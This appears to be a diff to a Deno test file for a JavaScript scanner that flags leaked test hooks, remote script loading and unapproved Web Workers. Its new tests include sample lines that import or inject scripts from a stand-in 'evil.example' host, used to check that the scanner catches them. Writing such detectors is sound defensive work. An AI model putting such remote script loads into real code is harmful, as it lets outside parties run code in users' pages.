@@ -17,7 +17,10 @@ async function withTemp(name, code) {
 async function violations(code, opts) {
   const { dir, file } = await withTemp("case.js", code);
   try {
-    return await scanShippedJs([file], { readText: (f) => Deno.readTextFile(f), ...(opts ?? {}) });
+    return await scanShippedJs([file], {
+      readText: (f) => Deno.readTextFile(f),
+      ...(opts ?? {}),
+    });
   } finally {
     await Deno.remove(dir, { recursive: true }).catch(() => {});
   }
@@ -56,19 +59,19 @@ Deno.test("scan: export const __z = 1 is caught", async () => {
 Deno.test("scan: window.__oracle = 1 is caught", async () => {
   const v = await violations(`window.__oracle = 1;`);
   assertEquals(v.length, 1);
-  assertEquals(v[0].includes("window[\"__oracle\"]"), true);
+  assertEquals(v[0].includes('window["__oracle"]'), true);
 });
 
 Deno.test("scan: globalThis[`__reset`] (template literal) is caught", async () => {
   const v = await violations("globalThis[`__reset`] = 1;");
   assertEquals(v.length, 1);
-  assertEquals(v[0].includes("globalThis[\"__reset\"]"), true);
+  assertEquals(v[0].includes('globalThis["__reset"]'), true);
 });
 
 Deno.test('scan: self["__" + "reset"] (folded string concat) is caught', async () => {
   const v = await violations(`self["__" + "reset"] = 1;`);
   assertEquals(v.length, 1);
-  assertEquals(v[0].includes("self[\"__reset\"]"), true);
+  assertEquals(v[0].includes('self["__reset"]'), true);
 });
 
 Deno.test("scan: globalThis.__zodResetForTest in SOURCE is caught (no exemption outside bundles)", async () => {
@@ -83,9 +86,80 @@ Deno.test("scan: globalThis.__zod_ok is ALLOWED only inside a generated bundle",
   assertEquals(v1.length, 1);
   // With the generated-bundle scope → allowed.
   const { dir, file } = await withTemp("bundle.js", `globalThis.__zod_ok = 1;`);
-  const v2 = await scanShippedJs([file], { readText: (f) => Deno.readTextFile(f), generatedBundles: new Set([file]) });
+  const v2 = await scanShippedJs([file], {
+    readText: (f) => Deno.readTextFile(f),
+    generatedBundles: new Set([file]),
+  });
   await Deno.remove(dir, { recursive: true }).catch(() => {});
   assertEquals(v2.length, 0);
+});
+
+Deno.test("scan: remote static/dynamic/importScripts script URLs are caught", async () => {
+  const staticImport = await violations(`import "https://evil.example/x.js";`);
+  assertEquals(
+    staticImport.some((row) => row.includes("remote script URL")),
+    true,
+  );
+  const dynamicImport = await violations(
+    `await import("//evil.example/x.js");`,
+  );
+  assertEquals(
+    dynamicImport.some((row) => row.includes("remote script URL")),
+    true,
+  );
+  const imported = await violations(
+    `importScripts("https://evil.example/x.js");`,
+  );
+  assertEquals(
+    imported.some((row) => row.includes("package-local literal")),
+    true,
+  );
+  const indirect = await violations(`importScripts(scriptUrl);`);
+  assertEquals(
+    indirect.some((row) => row.includes("package-local literal")),
+    true,
+  );
+});
+
+Deno.test("scan: remote src assignments are caught", async () => {
+  const assigned = await violations(
+    `script.src = "https://evil.example/x.js";`,
+  );
+  assertEquals(assigned.some((row) => row.includes("remote script URL")), true);
+  const attribute = await violations(
+    `script.setAttribute("src", "//evil.example/x.js");`,
+  );
+  assertEquals(
+    attribute.some((row) => row.includes("remote script URL")),
+    true,
+  );
+  const tainted = await violations(
+    `const loader = document.createElement("script"); loader.src = "https://evil.example/x.js";`,
+  );
+  assertEquals(tainted.some((row) => row.includes("remote script URL")), true);
+});
+
+Deno.test("scan: Worker policy rejects dynamic, remote and alternate literals", async () => {
+  const dynamic = await violations(`new Worker(workerUrl);`);
+  assertEquals(
+    dynamic.some((row) => row.includes("URL is not a literal")),
+    true,
+  );
+  const remote = await violations(`new Worker("https://evil.example/w.js");`);
+  assertEquals(remote.some((row) => row.includes("not allowlisted")), true);
+  const alternate = await violations(`new Worker("alternate-worker.js");`);
+  assertEquals(alternate.some((row) => row.includes("not allowlisted")), true);
+
+  const { dir, file } = await withTemp(
+    "worker.js",
+    `new Worker("reviewed-worker.js");`,
+  );
+  const allowed = await scanShippedJs([file], {
+    readText: (value) => Deno.readTextFile(value),
+    allowedWorkerLiterals: new Set(["reviewed-worker.js"]),
+  });
+  await Deno.remove(dir, { recursive: true }).catch(() => {});
+  assertEquals(allowed, []);
 });
 
 Deno.test("scan: a parse failure is a violation", async () => {
@@ -95,9 +169,13 @@ Deno.test("scan: a parse failure is a violation", async () => {
 });
 
 Deno.test("scan: a clean file has zero violations", async () => {
-  const v = await violations(`export const ok = 1; const fine = () => 2; globalThis.__internalLib = 3;`);
+  const v = await violations(
+    `export const ok = 1; const fine = () => 2; globalThis.__internalLib = 3;`,
+  );
   // __internalLib is NOT zod/vite — but it IS a __-prefixed global access, so it
   // is a violation. Use a truly clean file instead.
-  const v2 = await violations(`export const ok = 1; export function fine() { return 2; }`);
+  const v2 = await violations(
+    `export const ok = 1; export function fine() { return 2; }`,
+  );
   assertEquals(v2.length, 0);
 });
